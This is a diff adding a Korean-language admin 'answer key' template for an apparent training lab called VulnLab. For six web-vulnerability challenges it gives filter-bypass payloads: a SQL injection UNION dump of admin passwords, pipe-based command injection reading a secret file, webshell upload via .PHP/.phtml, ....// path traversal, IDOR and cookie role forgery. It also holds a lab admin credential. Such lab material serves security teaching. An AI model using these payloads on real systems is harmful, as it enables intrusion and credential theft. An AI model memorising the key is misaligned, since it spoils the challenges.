@@ -1,0 +1,94 @@
+{% extends "base.html" %}
+{% block title %}정답지 - VulnLab{% endblock %}
+{% block content %}
+<div class="card">
+  <h2>🗂 정답지 (Solutions)</h2>
+  <p class="muted" style="margin-bottom:1rem">이 페이지는 관리자 전용입니다. 각 취약점의 정확한 우회 방법과 목표를 설명합니다.</p>
+
+  <!-- ── Challenge 1: SQL Injection ── -->
+  <div class="solution-card">
+    <h3>[02] SQL Injection — 공백 필터 우회 + UNION 덤프</h3>
+    <p class="solution-meta">페이지: <code>/search</code> &nbsp;|&nbsp; 필터: 공백(" ") 제거</p>
+    <p><b>기본 페이로드 (차단됨):</b></p>
+    <div class="payload">' OR 1=1--</div>
+    <p><b>실제 우회 페이로드:</b> 공백을 <code>/**/</code>로 대체</p>
+    <div class="payload">'/**/OR/**/1=1--</div>
+    <p><b>관리자 비밀번호 덤프 페이로드:</b></p>
+    <div class="payload">'/**/UNION/**/SELECT/**/id,username,password/**/FROM/**/users/**/WHERE/**/role='admin'--</div>
+    <p><b>획득 정보:</b> admin_PB 계정의 비밀번호 <code>PBKOR!@</code></p>
+    <span class="flag">🏁 FLAG: SQL Injection으로 admin_PB / PBKOR!@ 획득</span>
+  </div>
+
+  <!-- ── Challenge 2: Command Injection ── -->
+  <div class="solution-card">
+    <h3>[03] Command Injection — ; &amp; 필터 우회</h3>
+    <p class="solution-meta">페이지: <code>/ping</code> &nbsp;|&nbsp; 필터: <code>;</code> 와 <code>&amp;</code> 제거</p>
+    <p><b>기본 페이로드 (차단됨):</b></p>
+    <div class="payload">127.0.0.1; id</div>
+    <p><b>실제 우회 페이로드:</b> <code>|</code> 파이프 사용</p>
+    <div class="payload">127.0.0.1| id</div>
+    <p><b>목표 파일 읽기 페이로드:</b></p>
+    <div class="payload">127.0.0.1|cat /app/data/secret.txt</div>
+    <p><b>획득 정보:</b> <code>/app/data/secret.txt</code> — 관리자 크리덴셜 (admin_PB / PBKOR!@)</p>
+    <span class="flag">🏁 FLAG: CMDi로 secret.txt 내용 출력 성공</span>
+  </div>
+
+  <!-- ── Challenge 3: File Upload ── -->
+  <div class="solution-card">
+    <h3>[04A] 파일 업로드 — 블랙리스트 대소문자 우회</h3>
+    <p class="solution-meta">페이지: <code>/upload</code> &nbsp;|&nbsp; 필터: 소문자 확장자 블랙리스트 (<code>php jsp asp aspx sh py rb pl</code>)</p>
+    <p><b>기본 페이로드 (차단됨):</b></p>
+    <div class="payload">webshell.php</div>
+    <p><b>실제 우회 페이로드:</b> 대문자 또는 혼합 대소문자 확장자 사용</p>
+    <div class="payload">webshell.PHP</div>
+    <div class="payload">webshell.PhP</div>
+    <div class="payload">webshell.phtml</div>
+    <p><b>원리:</b> 서버가 <code>ext in BLACKLIST_EXT</code>로만 검사하며 소문자 변환을 하지 않아 대소문자 혼용 시 통과</p>
+    <span class="flag">🏁 FLAG: .PHP / .phtml 확장자로 웹쉘 업로드 성공</span>
+  </div>
+
+  <!-- ── Challenge 4: Path Traversal ── -->
+  <div class="solution-card">
+    <h3>[04B] Path Traversal — ../ 단순 제거 우회</h3>
+    <p class="solution-meta">페이지: <code>/download</code> &nbsp;|&nbsp; 필터: <code>../</code> 를 한 번 제거</p>
+    <p><b>기본 페이로드 (차단됨):</b></p>
+    <div class="payload">../etc/passwd</div>
+    <p><b>실제 우회 페이로드:</b> <code>....//</code> 중첩 사용 (제거 후 <code>../</code> 재구성)</p>
+    <div class="payload">....//....//app/data/secret.txt</div>
+    <p><b>원리:</b> <code>....//</code>에서 <code>../</code>를 제거하면 <code>.../</code> → 실제로는 <code>../</code>가 남음</p>
+    <p><b>획득 정보:</b> <code>/app/data/secret.txt</code> — 관리자 크리덴셜</p>
+    <span class="flag">🏁 FLAG: Path Traversal로 secret.txt 읽기 성공</span>
+  </div>
+
+  <!-- ── Challenge 5: IDOR ── -->
+  <div class="solution-card">
+    <h3>[05] IDOR — URL 파라미터 직접 조작</h3>
+    <p class="solution-meta">페이지: <code>/mypage</code> &nbsp;|&nbsp; 필터: 없음 (인증 검사 자체가 없음)</p>
+    <p><b>기본 페이로드:</b></p>
+    <div class="payload">?user_id=1</div>
+    <p><b>원리:</b> 서버가 요청자 본인 여부를 확인하지 않고 <code>user_id</code> 파라미터를 그대로 DB 조회에 사용</p>
+    <p><b>우회 방법:</b> URL에서 <code>user_id</code> 값을 1~4로 변경하면 모든 사용자 정보 열람 가능</p>
+    <div class="payload">/mypage?user_id=1</div>
+    <p><b>획득 정보:</b> user_id=1 → admin_PB 계정의 이메일, 전화번호</p>
+    <span class="flag">🏁 FLAG: IDOR으로 다른 사용자 정보 열람 성공 (인식 챌린지)</span>
+  </div>
+
+  <!-- ── Challenge 6: Cookie Privilege Escalation ── -->
+  <div class="solution-card">
+    <h3>[06] 쿠키 권한 상승 — role 쿠키 변조</h3>
+    <p class="solution-meta">페이지: <code>/admin</code> &nbsp;|&nbsp; 필터: 없음 (쿠키를 서버 세션 없이 신뢰)</p>
+    <p><b>기본 페이로드 (현재 쿠키 상태):</b></p>
+    <div class="payload">role=user</div>
+    <p><b>실제 우회 페이로드:</b> 브라우저 개발자 도구에서 쿠키 값 변경</p>
+    <div class="payload">role=admin</div>
+    <p><b>우회 방법:</b></p>
+    <ol style="margin:.5rem 0 .5rem 1.5rem; color:#94a3b8; font-size:.88rem; line-height:1.8;">
+      <li>F12 → Application 탭 → Cookies → 현재 도메인 선택</li>
+      <li><code>role</code> 쿠키 값을 <code>user</code>에서 <code>admin</code>으로 변경</li>
+      <li><code>/admin</code> 페이지 새로고침</li>
+    </ol>
+    <p><b>원리:</b> 서버가 서명되지 않은 클라이언트 쿠키를 그대로 신뢰하며 세션 검증 없음</p>
+    <span class="flag">🏁 FLAG: role=admin 쿠키로 관리자 패널 접근 성공</span>
+  </div>
+</div>
+{% endblock %}
